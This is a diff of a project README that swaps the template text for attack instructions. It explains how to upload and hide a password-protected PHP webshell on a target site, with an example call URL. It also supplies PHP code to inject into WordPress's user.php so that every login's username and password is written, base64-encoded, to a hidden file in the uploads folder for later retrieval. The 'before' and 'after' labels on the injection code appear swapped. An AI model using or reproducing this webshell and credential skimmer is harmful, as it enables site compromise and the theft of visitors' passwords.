@@ -1,4 +1,4 @@
-# Project Title
+# JustRepository
 
 One Paragraph of project description goes here
 
@@ -6,31 +6,46 @@ One Paragraph of project description goes here
 
 These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.
 
-### Prerequisites
+### Webshell.php
 
-What things you need to install the software and how to install them
-
+simple webshell that protected with parameter.
+Upload shell. rename it with ".page.backup.php". 
+Call it with your own parameter:
 ```
-Give examples
-```
-
-### Installing
-
-A step by step series of examples that tell you how to get a development env running
-
-Say what the step will be
-
-```
-Give the example
+example.com/uploads/.page.backup.php?dxnboy=4343
 ```
 
-And repeat
+### Inject Wordpress
+
+Inject user.php in wordpress to record credentials that login. Required user priviledge that can write to wordpress directory. 
+edit file wordpress/wp-include/user.php
+before
 
 ```
-until finished
+if ( ! empty( $credentials['remember'] ) ) {
+                $credentials['remember'] = true;
+                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
+} else {
+                $credentials['remember'] = false;
+                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
+}
 ```
 
-End with an example of getting some data out of the system or using it for a little demo
+after inject
+```
+if ( ! empty( $credentials['remember'] ) ) {
+                $credentials['remember'] = true;
+} else {
+                $credentials['remember'] = false;
+}
+```
+
+Encoded with base64. call it in: and decode it with base64
+```
+wordpress/wp-content/uploads/.page.php.swp
+```
 
 ## Running the tests
 
